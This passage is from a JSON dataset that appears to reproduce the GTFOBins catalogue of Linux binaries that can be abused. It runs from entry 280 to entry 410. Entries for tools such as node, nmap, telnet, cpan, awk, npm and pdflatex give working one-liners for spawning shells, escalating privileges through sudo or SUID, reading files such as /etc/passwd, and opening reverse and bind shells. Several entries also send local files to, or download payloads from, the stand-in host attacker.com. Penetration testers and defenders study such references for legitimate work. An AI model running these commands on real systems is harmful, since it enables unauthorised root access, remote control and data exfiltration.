"linux", "cmd": "split", "function": "shell", "data": [{"description": "The shell prompt is not printed.", "code": "split --filter=/bin/sh /dev/stdin\n"}]}, "281": {"platform": "linux", "cmd": "split", "function": "sudo", "data": [{"description": "The shell prompt is not printed.", "code": "sudo split --filter=/bin/sh /dev/stdin\n"}]}, "282": {"platform": "linux", "cmd": "sg", "function": "shell", "data": [{"description": "Commands can be run if the current user's group is specified, therefore no additional permissions are needed.", "code": "sg $(id -ng)\n"}]}, "283": {"platform": "linux", "cmd": "sg", "function": "sudo", "data": [{"code": "sudo sg root\n"}]}, "284": {"platform": "linux", "cmd": "certbot", "function": "shell", "data": [{"code": "TF=$(mktemp -d)\ncertbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'\n"}]}, "285": {"platform": "linux", "cmd": "certbot", "function": "sudo", "data": [{"code": "TF=$(mktemp -d)\nsudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'\n"}]}, "286": {"platform": "linux", "cmd": "stdbuf", "function": "shell", "data": [{"code": "stdbuf -i0 /bin/sh"}]}, "287": {"platform": "linux", "cmd": "stdbuf", "function": "suid", "data": [{"code": "./stdbuf -i0 /bin/sh -p"}]}, "288": {"platform": "linux", "cmd": "stdbuf", "function": "sudo", "data": [{"code": "sudo stdbuf -i0 /bin/sh"}]}, "289": {"platform": "linux", "cmd": "cpan", "function": "shell", "data": [{"description": "`cpan` lets you execute perl commands with the `! command`.\n", "code": "cpan\n! exec '/bin/bash'\n"}]}, "290": {"platform": "linux", "cmd": "cpan", "function": "reverse-shell", "data": [{"description": "Run `nc -lvp RPORT` on the attacker box to receive the shell.", "code": "export RHOST=localhost\nexport RPORT=9000\ncpan\n! use Socket; my $i=\"$ENV{RHOST}\"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};\n"}]}, "291": {"platform": "linux", "cmd": "cpan", "function": "file-upload", "data": [{"description": "Serve files in the local folder running an HTTP server on port 8080. Install the dependency via `cpan HTTP::Server::Simple`.", "code": "cpan\n! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();\n"}]}, "292": {"platform": "linux", "cmd": "cpan", "function": "file-download", "data": [{"description": "Fetch a remote file via an HTTP GET request and store it in `PWD`.", "code": "export URL=http://attacker.com/file_to_get\ncpan\n! use File::Fetch; my $file = (File::Fetch->new(uri => \"$ENV{URL}\"))->fetch();\n"}]}, "293": {"platform": "linux", "cmd": "cpan", "function": "sudo", "data": [{"code": "sudo cpan\n! exec '/bin/bash'\n"}]}, "294": {"platform": "linux", "cmd": "node", "function": "shell", "data": [{"code": "node -e 'child_process.spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"}]}, "295": {"platform": "linux", "cmd": "node", "function": "file-write", "data": [{"code": "node -e 'fs.writeFileSync(\"file_to_write\", \"DATA\")'"}]}, "296": {"platform": "linux", "cmd": "node", "function": "file-read", "data": [{"code": "node -e 'process.stdout.write(fs.readFileSync(\"/bin/ls\"))'"}]}, "297": {"platform": "linux", "cmd": "node", "function": "file-download", "data": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nnode -e 'http.get(process.env.URL, res => res.pipe(fs.createWriteStream(process.env.LFILE)))'\n"}]}, "298": {"platform": "linux", "cmd": "node", "function": "file-upload", "data": [{"description": "Send a local file via HTTP POST request.", "code": "export URL=http://attacker.com\nexport LFILE=file_to_send\nnode -e 'fs.createReadStream(process.env.LFILE).pipe(http.request(process.env.URL))'\n"}]}, "299": {"platform": "linux", "cmd": "node", "function": "reverse-shell", "data": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nnode -e 'sh = child_process.spawn(\"/bin/sh\");\nnet.connect(process.env.RPORT, process.env.RHOST, function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n})'\n"}]}, "300": {"platform": "linux", "cmd": "node", "function": "bind-shell", "data": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell.", "code": "export LPORT=12345\nnode -e 'sh = child_process.spawn(\"/bin/sh\");\nnet.createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(process.env.LPORT)'\n"}]}, "301": {"platform": "linux", "cmd": "node", "function": "suid", "data": [{"code": "./node -e 'child_process.spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'\n"}]}, "302": {"platform": "linux", "cmd": "node", "function": "sudo", "data": [{"code": "sudo node -e 'child_process.spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"}]}, "303": {"platform": "linux", "cmd": "node", "function": "capabilities", "data": [{"code": "./node -e 'process.setuid(0); child_process.spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"}]}, "304": {"platform": "linux", "cmd": "cowsay", "function": "shell", "data": [{"code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\ncowsay -f $TF x\n"}]}, "305": {"platform": "linux", "cmd": "cowsay", "function": "sudo", "data": [{"code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x\n"}]}, "306": {"platform": "linux", "cmd": "telnet", "function": "shell", "data": [{"description": "BSD version only. Needs to be connected first.", "code": "RHOST=attacker.com\nRPORT=12345\ntelnet $RHOST $RPORT\n^]\n!/bin/sh\n"}]}, "307": {"platform": "linux", "cmd": "telnet", "function": "reverse-shell", "data": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "RHOST=attacker.com\nRPORT=12345\nTF=$(mktemp -u)\nmkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF\n"}]}, "308": {"platform": "linux", "cmd": "telnet", "function": "sudo", "data": [{"description": "BSD version only. Needs to be connected first.", "code": "RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh\n"}]}, "309": {"platform": "linux", "cmd": "telnet", "function": "limited-suid", "data": [{"description": "BSD version only. Needs to be connected first.", "code": "RHOST=attacker.com\nRPORT=12345\n./telnet $RHOST $RPORT\n^]\n!/bin/sh\n"}]}, "310": {"platform": "linux", "cmd": "nmap", "function": "shell", "data": [{"description": "Input echo is disabled.", "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nnmap --script=$TF\n"}, {"description": "The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.", "code": "nmap --interactive\nnmap> !sh\n"}]}, "311": {"platform": "linux", "cmd": "nmap", "function": "non-interactive-reverse-shell", "data": [{"description": "Run ``nc -l -p 12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp)\necho 'local s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nwhile true do\n  local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));t:send(b);\nend;\nf:close();t:close();' > $TF\nnmap --script=$TF\n"}]}, "312": {"platform": "linux", "cmd": "nmap", "function": "non-interactive-bind-shell", "data": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell.", "code": "export LPORT=12345\nTF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\nlocal c=s:accept();\nwhile true do\n  local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));c:send(b);\nend;c:close();f:close();' > $TF\nnmap --script=$TF\n"}]}, "313": {"platform": "linux", "cmd": "nmap", "function": "file-upload", "data": [{"description": "Send a local file via TCP. Run `socat -v tcp-listen:8080,reuseaddr,fork - on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080.", "code": "RHOST=attacker.com\nRPORT=8080\nLFILE=file_to_send\nnmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE\n"}, {"description": "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nTF=$(mktemp)\necho 'local f=io.open(os.getenv(\"LFILE\"), 'rb')\nlocal d=f:read(\"*a\")\nio.close(f);\nlocal s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nt:send(d);\nt:close();' > $TF\nnmap --script=$TF\n"}]}, "314": {"platform": "linux", "cmd": "nmap", "function": "file-download", "data": [{"description": "Fetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., `php -S 0.0.0.0:8080`. Note that multiple connections are made to the server and the result is placed in `$TF/IP/PORT/PATH`. Also, it is important that the port is a commonly used HTTP like 80 or 8080.", "code": "RHOST=attacker.com\nRPORT=8080\nTF=$(mktemp -d)\nLFILE=file_to_save\nnmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE\n"}, {"description": "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file.", "code": "export LPORT=12345\nexport LFILE=file_to_save\nTF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\nlocal c=s:accept();\nlocal d,x=c:receive(\"*a\");\nc:close();\nlocal f=io.open(os.getenv(\"LFILE\"), \"wb\");\nf:write(d);\nio.close(f);' > $TF\nnmap --script=$TF\n"}]}, "315": {"platform": "linux", "cmd": "nmap", "function": "file-write", "data": [{"code": "TF=$(mktemp)\necho 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"data\"); io.close(f);' > $TF\nnmap --script=$TF\n"}, {"description": "The payload appears inside the regular nmap output.", "code": "LFILE=file_to_write\nnmap -oG=$LFILE DATA\n"}]}, "316": {"platform": "linux", "cmd": "nmap", "function": "file-read", "data": [{"code": "TF=$(mktemp)\necho 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);' > $TF\nnmap --script=$TF\n"}]}, "317": {"platform": "linux", "cmd": "nmap", "function": "sudo", "data": [{"description": "Input echo is disabled.", "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n"}, {"description": "The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.", "code": "sudo nmap --interactive\nnmap> !sh\n"}]}, "318": {"platform": "linux", "cmd": "nmap", "function": "limited-suid", "data": [{"description": "Input echo is disabled.", "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\n./nmap --script=$TF\n"}]}, "319": {"platform": "linux", "cmd": "nmap", "function": "suid", "data": [{"description": "The payload appears inside the regular nmap output.", "code": "LFILE=file_to_write\n./nmap -oG=$LFILE DATA\n"}]}, "320": {"platform": "linux", "cmd": "su", "function": "sudo", "data": [{"code": "sudo su"}]}, "321": {"platform": "linux", "cmd": "pdflatex", "function": "shell", "data": [{"code": "pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"}]}, "322": {"platform": "linux", "cmd": "pdflatex", "function": "file-read", "data": [{"description": "The read file will be part of the output.", "code": "pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -\n"}]}, "323": {"platform": "linux", "cmd": "pdflatex", "function": "sudo", "data": [{"description": "The read file will be part of the output.", "code": "sudo pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -\n"}, {"code": "sudo pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"}]}, "324": {"platform": "linux", "cmd": "pdflatex", "function": "limited-suid", "data": [{"code": "./pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"}]}, "325": {"platform": "linux", "cmd": "latexmk", "function": "shell", "data": [{"code": "latexmk -e 'exec \"/bin/sh\";'"}, {"code": "latexmk -latex='/bin/sh"}]}, "326": {"platform": "linux", "cmd": "latexmk", "function": "file-read", "data": [{"code": "latexmk -e 'open(X,\"/etc/passwd\");while(<X>){print $_;}exit'"}, {"description": "The read file will be part of the output.", "code": "TF=$(mktemp)\necho '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}' >$TF\nstrings tmp.dvi\n"}]}, "327": {"platform": "linux", "cmd": "latexmk", "function": "sudo", "data": [{"code": "sudo latexmk -e 'exec \"/bin/sh\";'"}]}, "328": {"platform": "linux", "cmd": "vi", "function": "shell", "data": [{"code": "vi -c ':!/bin/sh' /dev/null"}, {"code": "vi\n:set shell=/bin/sh\n:shell\n"}]}, "329": {"platform": "linux", "cmd": "vi", "function": "file-write", "data": [{"code": "vi file_to_write\niDATA\n^[\nw\n"}]}, "330": {"platform": "linux", "cmd": "vi", "function": "file-read", "data": [{"code": "vi file_to_read"}]}, "331": {"platform": "linux", "cmd": "vi", "function": "sudo", "data": [{"code": "sudo vi -c ':!/bin/sh' /dev/null"}]}, "332": {"platform": "linux", "cmd": "man", "function": "shell", "data": [{"code": "man man\n!/bin/sh\n"}, {"description": "This only works for GNU `man` and requires GNU `troff` (`groff` to be installed).", "code": "man '-H/bin/sh #' man\n"}]}, "333": {"platform": "linux", "cmd": "man", "function": "file-read", "data": [{"code": "man file_to_read"}]}, "334": {"platform": "linux", "cmd": "man", "function": "sudo", "data": [{"code": "sudo man man\n!/bin/sh\n"}]}, "335": {"platform": "linux", "cmd": "more", "function": "shell", "data": [{"code": "TERM= more /etc/profile\n!/bin/sh\n"}]}, "336": {"platform": "linux", "cmd": "more", "function": "file-read", "data": [{"code": "more file_to_read"}]}, "337": {"platform": "linux", "cmd": "more", "function": "suid", "data": [{"code": "./more file_to_read"}]}, "338": {"platform": "linux", "cmd": "more", "function": "sudo", "data": [{"code": "TERM= sudo more /etc/profile\n!/bin/sh\n"}]}, "339": {"platform": "linux", "cmd": "rpm", "function": "shell", "data": [{"code": "rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"}, {"code": "rpm --pipe '/bin/sh 0<&1'"}]}, "340": {"platform": "linux", "cmd": "rpm", "function": "limited-suid", "data": [{"code": "./rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"}]}, "341": {"platform": "linux", "cmd": "rpm", "function": "sudo", "data": [{"code": "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"}, {"description": "It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n```\n", "code": "sudo rpm -ivh x-1.0-1.noarch.rpm\n"}]}, "342": {"platform": "linux", "cmd": "chown", "function": "suid", "data": [{"code": "LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE\n"}]}, "343": {"platform": "linux", "cmd": "chown", "function": "sudo", "data": [{"code": "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE\n"}]}, "344": {"platform": "linux", "cmd": "npm", "function": "shell", "data": [{"code": "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nnpm -C $TF i\n"}]}, "345": {"platform": "linux", "cmd": "npm", "function": "sudo", "data": [{"code": "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nsudo npm -C $TF --unsafe-perm i\n"}]}, "346": {"platform": "linux", "cmd": "rpmquery", "function": "shell", "data": [{"code": "rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"}]}, "347": {"platform": "linux", "cmd": "rpmquery", "function": "limited-suid", "data": [{"code": "./rpmquery --eval '%{lua:os.execute(\"/bin/sh\")}'"}]}, "348": {"platform": "linux", "cmd": "rpmquery", "function": "sudo", "data": [{"code": "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"}]}, "349": {"platform": "linux", "cmd": "redcarpet", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nredcarpet \"$LFILE\"\n"}]}, "350": {"platform": "linux", "cmd": "redcarpet", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo redcarpet \"$LFILE\"\n"}]}, "351": {"platform": "linux", "cmd": "irb", "function": "shell", "data": [{"code": "irb\nexec '/bin/bash'\n"}]}, "352": {"platform": "linux", "cmd": "irb", "function": "reverse-shell", "data": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST='127.0.0.1'\nexport RPORT=9000\nirb\nrequire 'socket'; exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read} end\n"}]}, "353": {"platform": "linux", "cmd": "irb", "function": "file-upload", "data": [{"description": "Serve files in the local folder running an HTTP server on port 8888.", "code": "irb\nrequire 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;\n"}]}, "354": {"platform": "linux", "cmd": "irb", "function": "file-download", "data": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nirb\nrequire 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])\n"}]}, "355": {"platform": "linux", "cmd": "irb", "function": "file-write", "data": [{"code": "irb\nFile.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }\n"}]}, "356": {"platform": "linux", "cmd": "irb", "function": "file-read", "data": [{"code": "irb\nputs File.read(\"file_to_read\")\n"}]}, "357": {"platform": "linux", "cmd": "irb", "function": "library-load", "data": [{"code": "irb\nrequire \"fiddle\"; Fiddle.dlopen(\"lib.so\")\n"}]}, "358": {"platform": "linux", "cmd": "irb", "function": "sudo", "data": [{"code": "sudo irb\nexec '/bin/bash'\n"}]}, "359": {"platform": "linux", "cmd": "ghci", "function": "shell", "data": [{"code": "ghci\nSystem.Process.callCommand \"/bin/sh\"\n"}]}, "360": {"platform": "linux", "cmd": "ghci", "function": "sudo", "data": [{"code": "sudo ghci\nSystem.Process.callCommand \"/bin/sh\"\n"}]}, "361": {"platform": "linux", "cmd": "mail", "function": "shell", "data": [{"description": "GNU version only.", "code": "mail --exec='!/bin/sh'"}, {"description": "This creates a valid Mbox file which may be required by the binary.", "code": "TF=$(mktemp)\necho \"From nobody@localhost $(date)\" > $TF\nmail -f $TF\n!/bin/sh\n"}]}, "362": {"platform": "linux", "cmd": "mail", "function": "sudo", "data": [{"description": "GNU version only.", "code": "sudo mail --exec='!/bin/sh'"}]}, "363": {"platform": "linux", "cmd": "look", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nlook '' \"$LFILE\"\n"}]}, "364": {"platform": "linux", "cmd": "look", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./look '' \"$LFILE\"\n"}]}, "365": {"platform": "linux", "cmd": "look", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo look '' \"$LFILE\"\n"}]}, "366": {"platform": "linux", "cmd": "dpkg", "function": "shell", "data": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "dpkg -l\n!/bin/sh\n"}]}, "367": {"platform": "linux", "cmd": "dpkg", "function": "sudo", "data": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo dpkg -l\n!/bin/sh\n"}, {"description": "It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'exec /bin/sh' > $TF/x.sh\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n```\n", "code": "sudo dpkg -i x_1.0_all.deb"}]}, "368": {"platform": "linux", "cmd": "nsenter", "function": "shell", "data": [{"code": "nsenter /bin/sh"}]}, "369": {"platform": "linux", "cmd": "nsenter", "function": "sudo", "data": [{"code": "sudo nsenter /bin/sh"}]}, "370": {"platform": "linux", "cmd": "latex", "function": "shell", "data": [{"code": "latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"}]}, "371": {"platform": "linux", "cmd": "latex", "function": "file-read", "data": [{"description": "The read file will be part of the output.", "code": "latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n"}]}, "372": {"platform": "linux", "cmd": "latex", "function": "sudo", "data": [{"description": "The read file will be part of the output.", "code": "sudo latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n"}, {"code": "sudo latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"}]}, "373": {"platform": "linux", "cmd": "latex", "function": "limited-suid", "data": [{"code": "./latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"}]}, "374": {"platform": "linux", "cmd": "file", "function": "file-read", "data": [{"description": "Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.", "code": "LFILE=file_to_read\nfile -f $LFILE\n"}, {"description": "Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.\n\nIf a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.\n\nIt can also be provided with a directory and will read each file in the directory.\n", "code": "LFILE=file_to_read\nfile -m $LFILE\n"}]}, "375": {"platform": "linux", "cmd": "file", "function": "suid", "data": [{"description": "Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.", "code": "LFILE=file_to_read\n./file -f $LFILE\n"}]}, "376": {"platform": "linux", "cmd": "file", "function": "sudo", "data": [{"description": "Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.", "code": "LFILE=file_to_read\nsudo file -f $LFILE\n"}]}, "377": {"platform": "linux", "cmd": "comm", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\n"}]}, "378": {"platform": "linux", "cmd": "comm", "function": "suid", "data": [{"code": "LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\n"}]}, "379": {"platform": "linux", "cmd": "comm", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null\n"}]}, "380": {"platform": "linux", "cmd": "mv", "function": "suid", "data": [{"code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE\n"}]}, "381": {"platform": "linux", "cmd": "mv", "function": "sudo", "data": [{"code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE\n"}]}, "382": {"platform": "linux", "cmd": "tex", "function": "shell", "data": [{"code": "tex --shell-escape '\\write18{/bin/sh}\\end'\n"}]}, "383": {"platform": "linux", "cmd": "tex", "function": "sudo", "data": [{"code": "sudo tex --shell-escape '\\write18{/bin/sh}\\end'\n"}]}, "384": {"platform": "linux", "cmd": "tex", "function": "limited-suid", "data": [{"code": "./tex --shell-escape '\\write18{/bin/sh}\\end'\n"}]}, "385": {"platform": "linux", "cmd": "ar", "function": "file-read", "data": [{"code": "OUTFILE=$(mktemp -u)\nLFILE=file_to_read\nar r \"$OUTFILE\" \"$LFILE\"\ncat \"$OUTFILE\"\n"}]}, "386": {"platform": "linux", "cmd": "ar", "function": "suid", "data": [{"code": "OUTFILE=$(mktemp -u)\nLFILE=file_to_read\n./ar r \"$OUTFILE\" \"$LFILE\"\ncat \"$OUTFILE\"\n"}]}, "387": {"platform": "linux", "cmd": "ar", "function": "sudo", "data": [{"code": "OUTFILE=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r \"$OUTFILE\" \"$LFILE\"\ncat \"$OUTFILE\"\n"}]}, "388": {"platform": "linux", "cmd": "base64", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nbase64 \"$LFILE\" | base64 --decode\n"}]}, "389": {"platform": "linux", "cmd": "base64", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode\n"}]}, "390": {"platform": "linux", "cmd": "base64", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode\n"}]}, "391": {"platform": "linux", "cmd": "check_raid", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ncheck_raid --extra-opts=@$LFILE\n"}]}, "392": {"platform": "linux", "cmd": "check_raid", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE\n"}]}, "393": {"platform": "linux", "cmd": "dig", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ndig -f $LFILE\n"}]}, "394": {"platform": "linux", "cmd": "dig", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo dig -f $LFILE\n"}]}, "395": {"platform": "linux", "cmd": "dig", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./dig -f $LFILE\n"}]}, "396": {"platform": "linux", "cmd": "soelim", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nsoelim \"$LFILE\"\n"}]}, "397": {"platform": "linux", "cmd": "soelim", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./soelim \"$LFILE\"\n"}]}, "398": {"platform": "linux", "cmd": "soelim", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo soelim \"$LFILE\"\n"}]}, "399": {"platform": "linux", "cmd": "cpio", "function": "shell", "data": [{"code": "echo '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:\n"}]}, "400": {"platform": "linux", "cmd": "cpio", "function": "file-read", "data": [{"description": "The content of the file is printed to standard output, between the cpio archive format header and footer.", "code": "LFILE=file_to_read\necho \"$LFILE\" | cpio -o\n"}, {"description": "The whole directory structure is copied to `$TF`.", "code": "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | cpio -dp $TF\ncat \"$TF/$LFILE\"\n"}]}, "401": {"platform": "linux", "cmd": "cpio", "function": "file-write", "data": [{"description": "Copies `$LFILE` to the `$LDIR` directory.", "code": "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | cpio -up $LDIR\n"}]}, "402": {"platform": "linux", "cmd": "cpio", "function": "suid", "data": [{"description": "The whole directory structure is copied to `$TF`.", "code": "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | ./cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n"}, {"description": "Copies `$LFILE` to the `$LDIR` directory.", "code": "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | ./cpio -R 0:0 -p $LDIR\n"}]}, "403": {"platform": "linux", "cmd": "cpio", "function": "sudo", "data": [{"code": "echo '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:\n"}, {"description": "The whole directory structure is copied to `$TF`.", "code": "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | sudo cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n"}, {"description": "Copies `$LFILE` to the `$LDIR` directory.", "code": "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | sudo cpio -R 0:0 -p $LDIR\n"}]}, "404": {"platform": "linux", "cmd": "awk", "function": "shell", "data": [{"code": "awk 'BEGIN {system(\"/bin/sh\")}'"}]}, "405": {"platform": "linux", "cmd": "awk", "function": "non-interactive-reverse-shell", "data": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "RHOST=attacker.com\nRPORT=12345\nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"}]}, "406": {"platform": "linux", "cmd": "awk", "function": "non-interactive-bind-shell", "data": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell.", "code": "LPORT=12345\nawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"}]}, "407": {"platform": "linux", "cmd": "awk", "function": "file-write", "data": [{"code": "LFILE=file_to_write\nawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n"}]}, "408": {"platform": "linux", "cmd": "awk", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nawk '//' \"$LFILE\"\n"}]}, "409": {"platform": "linux", "cmd": "awk", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./awk '//' \"$LFILE\"\n"}]}, "410": {"platform": "linux", "cmd": 